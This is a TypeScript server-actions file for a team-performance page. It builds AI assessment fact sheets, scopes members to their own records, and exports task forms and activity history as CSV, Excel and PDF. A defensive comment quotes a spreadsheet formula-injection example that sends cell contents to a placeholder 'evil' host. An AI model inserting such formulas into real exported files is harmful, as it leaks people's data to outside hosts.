'use server';

import { requireRole, requireUser } from '@/lib/auth/current-user';
import {
  activityEvents,
  personBrief,
  completedInWindow,
  dailyTaskForms,
  taskLedgerDetail,
  type LedgerDetail,
  performanceBoard,
  personDetail,
  type FormTaskRow,
  type PersonDetail,
  type PersonStat,
} from '@/lib/db/queries/performance';
import { companyLetterhead } from '@/lib/db/queries/invoices';
import {
  composeTaskAssignmentForms,
  type FormRow,
  type TaskFormSheet,
} from '@/lib/pdf/task-assignment-form';
import {
  writeActivitySummary,
  writeNarrative,
  type ActivitySummary,
  type Narrative,
} from '@/lib/ai/narrative';
import { dayWord, phraseOf, KIND_LABEL, eventKind } from '@/lib/view/activity';
import { toCsv } from '@/lib/domain/csv';
import {
  composeActivityHistory,
  type ActivityPdfDay,
  type ActivityPdfRow,
} from '@/lib/pdf/activity-history-pdf';
import {
  dayAccount,
  deadlineMoves,
  isSlip,
  onTime,
  qualityOfWork,
  rate,
  trend,
  type Move,
} from '@/lib/domain/performance';
import { isoDateIn, nowMs } from '@/lib/now';

/* ============================================================================
 * TEAM PERFORMANCE — the writes and the asks
 * ----------------------------------------------------------------------------
 * Owner, 2026-09-23: *"Plus here I also want AI assessments. By giving all this
 * information to AI … ask them to give an analysis or a report-type analysis …
 * how it is going, how it should be, and what things it should do next."*
 *
 * ── ⚠️ THE MODEL IS GIVEN THE FIGURES; IT NEVER COMPUTES THEM ─────────────
 * Everything below hands `writeNarrative` a fact sheet that is already totalled,
 * and that module's own rules forbid arithmetic and report any number in the
 * reply that is not in the sheet (`unverifiedFigures`). That matters more here
 * than on the CEO report: this page is read as a judgement about a named person,
 * and a fluent wrong number would end up in a conversation about their work.
 *
 * ── ⚠️ AND IT SAYS WHAT IS NOT MEASURED ───────────────────────────────────
 * The fact sheet states the gaps in the data — no logged hours, no leave
 * recorded, no rework recorded — so the model describes them rather than
 * quietly treating a missing number as a zero. A performance page that implies
 * somebody did nothing because nothing was recorded is the worst failure this
 * screen can have.
 * ========================================================================= */

export interface PerformanceInsight {
  readonly ok: boolean;
  readonly error?: string;
  readonly narrative?: Narrative;
  /** The sheet the model was given, so a reader can check its working. */
  readonly factSheet?: string;
}

export interface InsightScope {
  readonly from: string;
  readonly to: string;
  /** A named person, or null for the whole team. */
  readonly personId?: string | null;
  /**
   * What the manager typed into the ask box, or one of the four quick prompts.
   *
   * ⚠️ IT IS APPENDED TO THE FACT SHEET, NOT SENT AS A SECOND TURN. The sheet
   * is the only thing `verifyFigures` reads the reply back against, so a
   * question carried outside it would let the model answer with a figure this
   * page could not check. It is also truncated: the box is a question, not a
   * channel for pasting a prompt at somebody else's model.
   */
  readonly question?: string | null;
}

export async function performanceInsightAction(scope: InsightScope): Promise<PerformanceInsight> {
  const { user } = await requireRoleAndUser();
  try {
    const sheet = await buildFactSheet(user.id, allowedScope(scope, user));
    const narrative = await writeNarrative(sheet);
    return { ok: true, narrative, factSheet: sheet };
  } catch (error) {
    console.error('[performance] insight failed', error);
    return {
      ok: false,
      error:
        error instanceof Error && error.message.includes('CHATGPT_API_KEY')
          ? 'The AI key is not configured, so the written assessment is unavailable. Every figure on this page is still read from the database.'
          : 'The written assessment could not be produced. Every figure on this page is still read from the database.',
    };
  }
}

/**
 * Who is asking, and how wide their answer may be.
 *
 * ⚠️ A MEMBER MAY ASK, BUT ONLY ABOUT THEMSELVES. Owner, 2026-09-23: *"all
 * the other team members can view their own performance only."* Their scope is
 * overwritten with their own id here, so a crafted `personId` naming somebody
 * else is ignored — a server action is a public endpoint, and the page hiding a
 * dropdown protects nothing on its own.
 */
async function requireRoleAndUser() {
  const user = await requireUser();
  if (user.role !== 'member') await requireRole('team_coordinator');
  return { user, ownOnly: user.role === 'member' };
}

/** The scope this caller is allowed, whatever they asked for. */
function allowedScope<T extends { personId?: string | null }>(
  scope: T,
  user: { id: string; role: string },
): T {
  return user.role === 'member' ? { ...scope, personId: user.id } : scope;
}

/**
 * Everything the model is allowed to know, in plain sentences.
 *
 * ⚠️ WRITTEN AS PROSE, NOT JSON. `verifyFigures` reads the reply back against
 * this text, so a figure that appears here as "24" is verifiable and one hidden
 * inside a nested object is not.
 */
async function buildFactSheet(actorId: string, scope: InsightScope): Promise<string> {
  const today = isoDateIn();
  const period = { from: scope.from, to: scope.to, today };
  const previous = previousWindow(scope.from, scope.to);

  const [board, before, detail] = await Promise.all([
    performanceBoard(actorId, period),
    completedInWindow(actorId, previous, scope.personId ?? null),
    scope.personId ? personDetail(actorId, scope.personId, period) : Promise.resolve(null),
  ]);

  const lines: string[] = [];
  lines.push(`PERIOD: ${scope.from} to ${scope.to} (Asia/Karachi). Today is ${today}.`);

  if (scope.personId && detail) {
    const person = board.find((p) => p.id === scope.personId);
    lines.push(...personSheet(person, detail, scope, before));
  } else {
    lines.push(...teamSheet(board, before));
  }

  /* ── ⚠️ THE GAPS, STATED — see the header ─────────────────────────────── */
  lines.push('');
  lines.push('NOT RECORDED IN THIS SYSTEM (do not treat any of these as zero):');
  lines.push('- Hours worked. No timer entries exist, so effort is measured in estimate points and attendance days only.');
  lines.push('- Leave and availability. Nothing is recorded, so absence cannot be distinguished from a quiet week.');
  lines.push('- Reasons for a missed deadline. Deadline CHANGES are recorded with who made them; the cause is not.');
  lines.push('- Written review feedback. Almost no comments exist, so quality cannot be judged from what reviewers said.');

  const question = (scope.question ?? '').trim().slice(0, 400);
  if (question) {
    lines.push('');
    lines.push(`THE MANAGER ASKS: ${question}`);
    lines.push(
      'Answer that question directly in headline and summary, using only the figures above. ' +
        'If the fact sheet does not contain what the question needs, say plainly that it is not recorded. ' +
        'Fill strengths, risks and recommendations as usual.',
    );
  }

  return lines.join('\n');
}

function teamSheet(board: readonly PersonStat[], before: number): string[] {
  const completed = board.reduce((n, p) => n + p.completed, 0);
  const reviewed = board.reduce((n, p) => n + p.reviewed, 0);
  const onTimeCount = board.reduce((n, p) => n + p.onTime, 0);
  const judged = board.reduce((n, p) => n + p.judged, 0);
  const overdue = board.reduce((n, p) => n + p.overdue, 0);
  const awaiting = board.reduce((n, p) => n + p.awaitingReview, 0);
  const t = trend(completed, before);
  const otRate = rate(onTimeCount, judged);

  const lines = [
    '',
    'THE TEAM IN THIS PERIOD:',
    `- Tasks completed: ${completed}.`,
    `- Of those, ${reviewed} went through review; ${completed - reviewed} were closed by the person who did them.`,
    judged > 0
      ? `- On time: ${onTimeCount} of ${judged} tasks that had a deadline (${otRate.value}%). Tasks with no deadline are not judged.`
      : '- On time: no completed task in this period had a deadline, so on-time delivery is not measurable.',
    `- Open and past their due date right now: ${overdue}.`,
    `- Waiting on a reviewer right now: ${awaiting}.`,
    t.changePct === null
      ? `- The previous period completed ${before}, so no percentage change is meaningful.`
      : `- The previous period completed ${before}; the change is ${t.changePct}%.`,
    '',
    'BY PERSON (completed, reviewed, on time of judged, overdue now):',
  ];
  for (const p of board) {
    if (p.completed === 0 && p.openNow === 0) continue;
    lines.push(
      `- ${p.name}${p.roleTitle ? ` (${p.roleTitle})` : ''}: completed ${p.completed}, reviewed ${p.reviewed}, on time ${p.onTime} of ${p.judged}, overdue ${p.overdue}, open ${p.openNow}.`,
    );
  }
  return lines;
}

function personSheet(
  person: PersonStat | undefined,
  detail: PersonDetail,
  scope: InsightScope,
  before: number,
): string[] {
  const name = person?.name ?? 'This person';
  /* ⚠️ Narrowed to the tasks in this period — see the same note in
     components/performance/person-drawer.tsx. The fact sheet must not hand the
     model two denominators from two different periods. */
  const inPeriod = new Set(detail.tasks.map((t) => t.id));
  const byTask = new Map<string, Move[]>();
  for (const m of detail.moves) {
    if (!inPeriod.has(m.taskId)) continue;
    const list = byTask.get(m.taskId) ?? [];
    list.push(m);
    byTask.set(m.taskId, list);
  }
  const quality = qualityOfWork(byTask);
  const timing = onTime(detail.tasks);
  const moves = deadlineMoves(
    detail.history.map((h) => ({
      taskId: h.taskId ?? '',
      action: h.action,
      actorId: null,
      at: h.at,
      before: h.before,
      after: h.after,
    })),
  );
  const slips = moves.filter(isSlip).length;
  const t = trend(person?.completed ?? 0, before);
  const today = isoDateIn();
  const day = dayAccount(
    detail.tasks.map((x) => ({
      dueDate: x.dueDate,
      status: x.status,
      completedOn: x.completedOn,
      createdOn: x.createdOn,
      assignedOn: null,
    })),
    today,
  );

  return [
    '',
    `THE PERSON: ${name}${person?.roleTitle ? `, ${person.roleTitle}` : ''}.`,
    `- Tasks completed in the period: ${person?.completed ?? 0}.`,
    `- Open right now: ${person?.openNow ?? 0}, of which ${person?.overdue ?? 0} are past their due date.`,
    timing.judged > 0
      ? `- On time: ${timing.onTime} of ${timing.judged} tasks that had a deadline; ${timing.late} were late.`
      : '- On time: none of their completed tasks had a deadline, so on-time delivery is not measurable.',
    `- Went through review: ${quality.reviewed} of ${quality.completed} completed tasks.`,
    quality.reviewed > 0
      ? `- Approved on the first submission: ${quality.firstPass}. Sent back for changes: ${quality.sentBack}. Submitted more than once: ${quality.resubmitted}. Reopened after being closed: ${quality.reopened}.`
      : '- No task of theirs went through review in this period, so first-pass approval cannot be measured.',
    `- Deadlines moved on their work: ${moves.length}, of which ${slips} gave the work more time.`,
    `- Recorded actions in the log: ${detail.history.length}. Attendance days present: ${detail.daysPresent}.`,
    `- Today (${today}): ${day.planned} planned, ${day.unexpected} arrived today, ${day.completed} finished, ${day.unfinished} still open, ${day.carriedForward} carried over from earlier days.`,
    t.changePct === null
      ? `- The previous period completed ${before}, so no percentage change is meaningful.`
      : `- The previous period completed ${before}; the change is ${t.changePct}%.`,
    `- Effort points completed: ${person?.effortPoints ?? 0}, against a weekly capacity of ${person?.weeklyCapacityPoints ?? 0} points.`,
  ];
}

/** The window of the same length immediately before this one. */
function previousWindow(from: string, to: string): { from: string; to: string } {
  const a = Date.parse(`${from}T00:00:00Z`);
  const b = Date.parse(`${to}T00:00:00Z`);
  const span = Math.max(b - a, 0) + 86_400_000;
  return {
    from: new Date(a - span).toISOString().slice(0, 10),
    to: new Date(b - span).toISOString().slice(0, 10),
  };
}

/* ── The person drawer's own read, so opening somebody is one round trip ── */

export interface PersonPayload {
  readonly ok: boolean;
  readonly error?: string;
  readonly detail?: PersonDetail;
  readonly previousCompleted?: number;
}

export async function personPerformanceAction(
  personId: string,
  period: { from: string; to: string },
): Promise<PersonPayload> {
  const { user, ownOnly } = await requireRoleAndUser();
  /* ⚠️ A MEMBER OPENS THEMSELVES, whichever id arrived. */
  const who = ownOnly ? user.id : personId;
  try {
    const [detail, previousCompleted] = await Promise.all([
      personDetail(user.id, who, period),
      completedInWindow(user.id, previousWindow(period.from, period.to), who),
    ]);
    return { ok: true, detail, previousCompleted };
  } catch (error) {
    console.error('[performance] person read failed', error);
    return { ok: false, error: 'That person’s record could not be read.' };
  }
}

/** So the clock is the server's — `nowMs` is not importable from a client file. */
export async function performanceNowAction(): Promise<{ nowMs: number; today: string }> {
  await requireRoleAndUser();
  return { nowMs: nowMs(), today: isoDateIn() };
}


/* ============================================================================
 * THE DAILY TASK ASSIGNMENT FORM — owner, 2026-09-24
 * ----------------------------------------------------------------------------
 * *"Every person can download or export their daily task in this template from
 * the performance page ... you will show that today's tasks are: these ones are
 * completed, these are left, these are overdue."*
 *
 * ── ⚠️ THE SCOPE IS THE CALLER'S, NOT THE ARGUMENT'S ─────────────────────
 * A Member exports themselves whatever the request says — the same override the
 * page applies, repeated here because a server action is a public endpoint.
 * ========================================================================= */

export interface FormExport {
  readonly ok: boolean;
  readonly error?: string;
  readonly base64?: string;
  readonly sheets?: number;
  readonly fileName?: string;
}

/** The paper form offers three boxes; the system has four priorities. */
const PRIORITY_BOX: Record<string, 'High' | 'Medium' | 'Low'> = {
  urgent: 'High',
  high: 'High',
  medium: 'Medium',
  low: 'Low',
};

const PRIORITY_WORD: Record<string, string> = {
  urgent: 'Urgent',
  high: 'High',
  medium: 'Medium',
  low: 'Low',
};

/**
 * How a row reads in "Progress on Task".
 *
 * ⚠️ OVERDUE IS A FACT ABOUT THE DAY, NOT A STATUS. Nothing in the database is
 * "overdue" — it is open with a due date that has passed, judged against the
 * day the sheet is for. The owner asked for that word on the sheet, so it is
 * computed here rather than looked up.
 */
function progressOf(row: FormTaskRow, day: string): { progress: string; tone: FormRow['tone'] } {
  if (row.status === 'done') {
    return { progress: row.completedOn === day ? 'Completed today' : 'Completed', tone: 'green' };
  }
  if (row.status === 'cancelled') return { progress: 'Cancelled', tone: 'grey' };
  if (row.dueDate && row.dueDate < day) return { progress: 'Overdue', tone: 'red' };
  if (row.status === 'blocked') return { progress: 'Blocked', tone: 'red' };
  if (row.status === 'in_review') return { progress: 'In review', tone: 'amber' };
  if (row.status === 'in_progress') return { progress: 'In progress', tone: 'amber' };
  if (row.status === 'revisions') return { progress: 'In revision', tone: 'amber' };
  return { progress: 'Not started', tone: 'amber' };
}

const dayLabel = (iso: string) =>
  new Date(`${iso}T00:00:00Z`).toLocaleDateString('en-GB', {
    timeZone: 'UTC',
    weekday: 'long',
    day: 'numeric',
    month: 'long',
    year: 'numeric',
  });

const shortDay = (iso: string | null) =>
  iso
    ? new Date(`${iso}T00:00:00Z`).toLocaleDateString('en-GB', {
        timeZone: 'UTC',
        day: '2-digit',
        month: 'short',
        year: '2-digit',
      })
    : '-';

/** A whole month of sheets for sixteen people is already ~500 pages. */
const MAX_DAYS = 31;

export async function exportTaskFormsAction(scope: {
  from: string;
  to: string;
  personId?: string | null;
  departmentId?: string | null;
  projectId?: string | null;
}): Promise<FormExport> {
  const { user, ownOnly } = await requireRoleAndUser();

  const from = scope.from;
  const span = Math.round(
    (Date.parse(`${scope.to}T00:00:00Z`) - Date.parse(`${from}T00:00:00Z`)) / 86_400_000,
  );
  if (!Number.isFinite(span) || span < 0) {
    return { ok: false, error: 'That date range is not valid.' };
  }
  if (span + 1 > MAX_DAYS) {
    return {
      ok: false,
      error: `That range is ${span + 1} days. Export up to ${MAX_DAYS} days at a time — a longer range makes a document nobody can read.`,
    };
  }

  try {
    const [forms, company] = await Promise.all([
      dailyTaskForms(
        user.id,
        { from, to: scope.to },
        {
          personId: ownOnly ? user.id : (scope.personId ?? null),
          departmentId: ownOnly ? null : (scope.departmentId ?? null),
          projectId: scope.projectId ?? null,
        },
      ),
      companyLetterhead(user.id),
    ]);

    /* ⚠️ A PERSON-DAY WITH NO TASKS GETS NO SHEET. `dailyTaskForms` only returns
       days that have rows, so an empty Sunday is absent rather than printed as
       a blank form somebody has to throw away. */
    const sheets: TaskFormSheet[] = forms.map((f) => {
      const rows: FormRow[] = f.rows.map((r) => {
        const p = progressOf(r, f.day);
        return {
          reference: `${r.reference}  ·  ${r.projectName}`,
          description: r.title,
          /* One task has exactly one assigner — the owner's point. When that is
             the person themselves, say so instead of printing their own name. */
          assignedBy: r.selfRaised ? 'Self' : (r.assignedByName ?? '-'),
          priority: PRIORITY_WORD[r.priority] ?? r.priority,
          startDate: shortDay(r.startDate),
          endDate: shortDay(r.dueDate),
          progress: p.progress,
          tone: p.tone,
        };
      });

      const given = f.rows.filter((r) => !r.selfRaised && r.assignedByName);
      const names = [...new Set(given.map((r) => r.assignedByName as string))];
      /* The header's single "Assigned By" holds when a day came from one person;
         when it did not, the rows carry it and the header says so. */
      const assignedBy =
        names.length === 1
          ? names[0]
          : names.length === 0
            ? 'Self-raised'
            : `Various (${names.length} people - see rows)`;

      const boxes = [...new Set(f.rows.map((r) => PRIORITY_BOX[r.priority]).filter(Boolean))];
      const order: Array<'High' | 'Medium' | 'Low'> = ['High', 'Medium', 'Low'];
      const priority = order.find((b) => boxes.includes(b)) ?? null;

      const completed = f.rows.filter((r) => r.status === 'done').length;
      const overdue = f.rows.filter(
        (r) => r.status !== 'done' && r.status !== 'cancelled' && r.dueDate && r.dueDate < f.day,
      ).length;
      const remaining = f.rows.filter(
        (r) => r.status !== 'done' && r.status !== 'cancelled',
      ).length;

      return {
        name: f.personName,
        department: f.department ?? '-',
        designation: f.designation ?? '-',
        assignedBy,
        assignedDate: dayLabel(f.day),
        priority,
        dayLabel: dayLabel(f.day),
        rows,
        completed,
        remaining,
        overdue,
      };
    });

    if (sheets.length === 0) {
      return {
        ok: false,
        error: 'Nothing was due, completed or outstanding in that range, so there is no form to print.',
      };
    }

    const bytes = await composeTaskAssignmentForms({
      company,
      generatedFor: user.fullName,
      generatedAt: new Intl.DateTimeFormat('en-GB', {
        timeZone: 'Asia/Karachi',
        day: 'numeric',
        month: 'short',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      }).format(new Date()),
      sheets,
    });

    const one = sheets.length === 1 ? `-${sheets[0].name.replace(/\s+/g, '-')}` : '';
    return {
      ok: true,
      base64: Buffer.from(bytes).toString('base64'),
      sheets: sheets.length,
      fileName: `task-assignment-form${one}-${from}${from === scope.to ? '' : `_to_${scope.to}`}.pdf`,
    };
  } catch (error) {
    console.error('[performance] task form export failed', error);
    return { ok: false, error: 'The form could not be made. Nothing was changed.' };
  }
}


/* ── One task, for the ledger's right-hand panel ─────────────────────────── */

export interface LedgerDetailPayload {
  readonly ok: boolean;
  readonly error?: string;
  readonly detail?: LedgerDetail;
}

/**
 * The timeline, files and comments for one task.
 *
 * ⚠️ THE ONLY THING THE LEDGER FETCHES ON A CLICK. Everything the row shows is
 * already on the page; this is the part a row genuinely could not know (Rule
 * Zero, law 3). RLS decides whether the caller may see the task at all, so a
 * crafted id returns somebody else's task only if they could already open it.
 */
export async function taskLedgerDetailAction(taskId: string): Promise<LedgerDetailPayload> {
  const { user } = await requireRoleAndUser();
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(taskId)) {
    return { ok: false, error: 'That task id is not valid.' };
  }
  try {
    return { ok: true, detail: await taskLedgerDetail(user.id, taskId) };
  } catch (error) {
    console.error('[performance] ledger detail failed', error);
    return { ok: false, error: 'That task could not be read.' };
  }
}

/* ============================================================================
 * SUMMARISE THIS ACTIVITY \u2014 owner, 2026-09-24
 * ----------------------------------------------------------------------------
 * The button on the Activity history panel. The browser sends the ids of the
 * events currently in view; every word the model reads is fetched back out of
 * the database here (see `activityEvents`), phrased by the same pure module the
 * rows themselves use, and handed over already decided.
 * ========================================================================= */

export interface ActivitySummaryPayload {
  readonly ok: boolean;
  readonly error?: string;
  readonly summary?: ActivitySummary;
  /** The exact log the model was given, so a reader can check its working. */
  readonly log?: string;
}

export async function activitySummaryAction(
  personId: string,
  eventIds: readonly string[],
): Promise<ActivitySummaryPayload> {
  const { user, ownOnly } = await requireRoleAndUser();
  /* \u26a0\ufe0f A MEMBER SUMMARISES THEMSELVES, whichever id arrived. */
  const who = ownOnly ? user.id : personId;

  /* \u26a0\ufe0f CAPPED BEFORE THE ROUND TRIP. 400 events is the read's own ceiling;
     the newest 120 is as much as the model can usefully describe, and it keeps
     a pasted list of ids from becoming an expensive request. */
  const ids = [...new Set(eventIds)].filter((id) => UUID_RE.test(id)).slice(0, 120);
  if (ids.length === 0) {
    return { ok: false, error: 'There are no events in view to summarise.' };
  }

  try {
    const events = await activityEvents(user.id, who, ids);
    if (events.length === 0) {
      return { ok: false, error: 'Those events could not be read.' };
    }
    const log = activityFactSheet(events);
    const summary = await writeActivitySummary(log);
    return { ok: true, summary, log };
  } catch (error) {
    console.error('[performance] activity summary failed', error);
    return {
      ok: false,
      error:
        error instanceof Error && error.message.includes('CHATGPT_API_KEY')
          ? 'The AI key is not configured, so the written summary is unavailable. Every event below is still read from the database.'
          : 'The written summary could not be produced. Every event below is still read from the database.',
    };
  }
}

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

/**
 * The events as lines the model may only rearrange.
 *
 * \u26a0\ufe0f IT STATES WHAT IS MISSING. A move with no recorded reason says so on
 * its own line, because a model given silence will fill it \u2014 and a plausible
 * invented reason on a page about a named colleague is the worst thing this
 * screen could print.
 */
function activityFactSheet(events: readonly Awaited<ReturnType<typeof activityEvents>>[number][]): string {
  const when = (iso: string) =>
    new Date(iso).toLocaleString('en-GB', {
      timeZone: 'Asia/Karachi',
      day: 'numeric',
      month: 'short',
      hour: '2-digit',
      minute: '2-digit',
      hour12: false,
    });

  const lines = events.map((e) => {
    const p = phraseOf(e);
    const task = e.title ?? 'a task';
    const diff = p.changes
      .map((c) => `${c.field}: ${c.from ?? 'not set'} to ${c.to ?? 'not set'}`)
      .join('; ');
    return [
      `${when(e.at)} PKT \u2014 ${e.actorName ?? 'Somebody'} ${p.verb} "${task}"`,
      e.projectName ? ` in ${e.projectName}` : '',
      diff ? ` (${diff})` : '',
      p.note ? ` [${p.note}]` : '',
      e.reason ? ` Reason given: "${e.reason}".` : '',
    ].join('');
  });

  const withReason = events.filter((e) => e.reason).length;

  return [
    `EVENTS: ${events.length}, oldest first.`,
    '',
    ...lines,
    '',
    'NOT RECORDED:',
    `- A reason was recorded on ${withReason} of these ${events.length} events. The product asks for a reason when work is blocked or cancelled and at no other time, so the rest were never asked. Do not supply one.`,
    '- Hours worked are not recorded anywhere in this system, so nothing here says how long anything took.',
    '- Rework is not recorded as such; a task returning to an earlier status is the only trace of it.',
  ].join('\n');
}

/* ============================================================================
 * EXPORTING THE ACTIVITY HISTORY \u2014 owner, 2026-09-24
 * ----------------------------------------------------------------------------
 * *"Export also show a drop-up option of export in CSV and Excel and PDF ...
 * PDF in a proper template."*
 *
 * \u26a0\ufe0f ALL THREE ARE BUILT HERE, NOT IN THE BROWSER. The first version wrote
 * the CSV client-side, which is fast and wrong: a task titled
 * `=HYPERLINK("http://evil/"&A1,"brief")` is a live formula the moment the file
 * opens, and task titles are typed by people. `lib/domain/csv.ts` already
 * neutralises that and is not reimplemented \u2014 two copies of a security control
 * is one copy that gets forgotten. Building all three in one place also means
 * the spreadsheet and the sheet cannot drift from each other.
 *
 * \u26a0\ufe0f AND THE ROWS ARE READ BACK FROM THE DATABASE, not posted up from the
 * page. The browser sends the ids of what it had in view; every word in the
 * file is fetched under the caller's own RLS.
 * ========================================================================= */

export type ActivityFormat = 'csv' | 'xlsx' | 'pdf';

export interface ActivityExport {
  readonly ok: boolean;
  readonly error?: string;
  readonly base64?: string;
  readonly fileName?: string;
  readonly mime?: string;
  readonly events?: number;
}

const ACTIVITY_MIME: Record<ActivityFormat, string> = {
  csv: 'text/csv;charset=utf-8',
  xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  pdf: 'application/pdf',
};

export async function exportActivityAction(request: {
  personId: string;
  eventIds: readonly string[];
  format: ActivityFormat;
  /** What the screen was narrowed to, already worded, for the sheet's header. */
  filters?: readonly string[];
  periodLabel?: string;
  totalInPeriod?: number;
}): Promise<ActivityExport> {
  const { user, ownOnly } = await requireRoleAndUser();
  const who = ownOnly ? user.id : request.personId;

  const ids = [...new Set(request.eventIds)].filter((id) => UUID_RE.test(id)).slice(0, 400);
  if (ids.length === 0) return { ok: false, error: 'There are no events in view to export.' };

  try {
    const [events, person] = await Promise.all([
      activityEvents(user.id, who, ids),
      personBrief(user.id, who),
    ]);
    if (events.length === 0) return { ok: false, error: 'Those events could not be read.' };

    /* Newest first, the way the screen reads. `activityEvents` returns oldest
       first because that is the order the model is given. */
    const rows = [...events]
      .sort((a, b) => b.at.localeCompare(a.at))
      .map((e) => activityRow(e));

    const slug = (person?.name ?? 'person').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
    const stem = `activity-${slug}-${isoDateIn()}`;

    if (request.format === 'csv') {
      const csv = toCsv(
        ACTIVITY_HEADERS,
        rows.map((r) => [r.date, r.time, r.actor, r.event, r.task, r.reference, r.project, r.change, r.reason, r.source]),
      );
      return {
        ok: true,
        base64: Buffer.from(csv, 'utf8').toString('base64'),
        fileName: `${stem}.csv`,
        mime: ACTIVITY_MIME.csv,
        events: rows.length,
      };
    }

    if (request.format === 'xlsx') {
      const bytes = await activityToXlsx(person?.name ?? 'Team member', request, rows);
      return {
        ok: true,
        base64: bytes.toString('base64'),
        fileName: `${stem}.xlsx`,
        mime: ACTIVITY_MIME.xlsx,
        events: rows.length,
      };
    }

    const company = await companyLetterhead(user.id);
    /* Grouped the way the screen groups, in the order the rows arrived. */
    const days: ActivityPdfDay[] = [];
    for (const r of rows) {
      const last = days[days.length - 1];
      if (last && last.label === r.date) (last.rows as ActivityPdfRow[]).push(r.pdf);
      else days.push({ label: r.date, rows: [r.pdf] });
    }

    const bytes = await composeActivityHistory({
      company,
      personName: person?.name ?? 'Team member',
      personRole: person?.roleTitle ?? '',
      periodLabel: request.periodLabel ?? '',
      filters: request.filters ?? [],
      totalInPeriod: request.totalInPeriod ?? rows.length,
      days,
      /* ⚠️ dayWord, NOT month: 'short'. en-GB writes "24 Sept 2026" while every
         other date on this page and in this file writes "24 Sep 2026". */
      generatedAt: [
        dayWord(new Date(nowMs()).toLocaleDateString('en-CA', { timeZone: 'Asia/Karachi' })),
        new Date(nowMs()).toLocaleTimeString('en-GB', {
          timeZone: 'Asia/Karachi',
          hour: '2-digit',
          minute: '2-digit',
          hour12: false,
        }),
      ].join(', '),
      generatedFor: user.fullName,
    });

    return {
      ok: true,
      base64: Buffer.from(bytes).toString('base64'),
      fileName: `${stem}.pdf`,
      mime: ACTIVITY_MIME.pdf,
      events: rows.length,
    };
  } catch (error) {
    console.error('[performance] activity export failed', error);
    return { ok: false, error: 'That export could not be made.' };
  }
}

const ACTIVITY_HEADERS = [
  'Date',
  'Time (PKT)',
  'Who',
  'Event',
  'Task',
  'Reference',
  'Project',
  'What changed',
  'Reason given',
  'Where the task came from',
] as const;

const SOURCE_WORD: Record<string, string> = {
  self: 'Self-created',
  coordinator: 'Assigned by a team coordinator',
  admin: 'Assigned by an admin',
  teammate: 'Seeded data',
  unknown: 'Not recorded',
};

/** One event, worded once, for all three formats. */
function activityRow(e: Awaited<ReturnType<typeof activityEvents>>[number]) {
  const p = phraseOf(e);
  const at = new Date(e.at);
  const date =
    dayWord(at.toLocaleDateString('en-CA', { timeZone: 'Asia/Karachi' })) ?? '';
  const time = at.toLocaleTimeString('en-GB', {
    timeZone: 'Asia/Karachi',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false,
  });
  const change =
    p.changes.length > 0
      ? p.changes.map((c) => `${c.field}: ${c.from ?? 'not set'} -> ${c.to ?? 'not set'}`).join('; ')
      : (p.note ?? '');
  const event = KIND_LABEL[eventKind(e.action)];
  const task = e.title ?? '';
  const project = e.projectName ?? '';
  const actor = e.actorName ?? 'Not recorded';
  const reason = e.reason ?? '';

  return {
    date,
    time,
    actor,
    event,
    task,
    reference: e.reference ?? '',
    project,
    change,
    reason,
    source: SOURCE_WORD[e.sourceKind] ?? 'Not recorded',
    pdf: { time, actor, event, task, project, change, reason } satisfies ActivityPdfRow,
  };
}

/**
 * The spreadsheet.
 *
 * \u26a0\ufe0f TWO SHEETS, for the same reason the Reports export has two: a header
 * block sitting above the table breaks sorting, filtering and every formula
 * that assumes row 1 is the header. The context travels in "About".
 */
async function activityToXlsx(
  name: string,
  request: { periodLabel?: string; filters?: readonly string[]; totalInPeriod?: number },
  rows: ReturnType<typeof activityRow>[],
): Promise<Buffer> {
  const writeXlsxFile = (await import('write-excel-file/node')).default;
  type Cell = import('write-excel-file/node').CellObject;

  const header: Cell[] = ACTIVITY_HEADERS.map((label) => ({
    value: label,
    fontWeight: 'bold',
    backgroundColor: '#0F3D3E',
    color: '#FFFFFF',
    align: 'left',
  }));

  const body: Cell[][] = rows.map((r) =>
    [r.date, r.time, r.actor, r.event, r.task, r.reference, r.project, r.change, r.reason, r.source].map(
      (value): Cell => (value === '' ? {} : { value, type: String }),
    ),
  );

  const about: Cell[][] = [
    [{ value: `Activity history \u2014 ${name}`, fontWeight: 'bold' }],
    [{ value: request.periodLabel ?? '' }],
    [],
    [
      { value: 'Events in this file', fontWeight: 'bold' },
      { value: rows.length, type: Number },
    ],
    [
      { value: 'Events in the period', fontWeight: 'bold' },
      { value: request.totalInPeriod ?? rows.length, type: Number },
    ],
    [],
    [{ value: 'Filters applied', fontWeight: 'bold' }],
    ...(request.filters && request.filters.length > 0
      ? request.filters.map((f): Cell[] => [{ value: f }])
      : [[{ value: 'None \u2014 this is the whole period.' }] as Cell[]]),
    [],
    [{ value: 'How to read this', fontWeight: 'bold' }],
    [
      {
        value:
          'A reason is recorded only where the product asks for one, which is when work is blocked or cancelled. An empty Reason means nobody was asked, not that nobody had one.',
        wrap: true,
      },
    ],
    [
      {
        value:
          'Hours worked are not recorded anywhere in this system, so nothing here says how long a piece of work took.',
        wrap: true,
      },
    ],
  ];

  const { toBuffer } = await writeXlsxFile([
    {
      data: [header, ...body],
      sheet: 'Activity',
      columns: [
        { width: 14 }, { width: 10 }, { width: 20 }, { width: 16 }, { width: 38 },
        { width: 12 }, { width: 22 }, { width: 34 }, { width: 26 }, { width: 26 },
      ],
      stickyRowsCount: 1,
      orientation: 'landscape',
    },
    { data: about, sheet: 'About', columns: [{ width: 30 }, { width: 60 }], showGridLines: false },
  ]);

  return toBuffer();
}
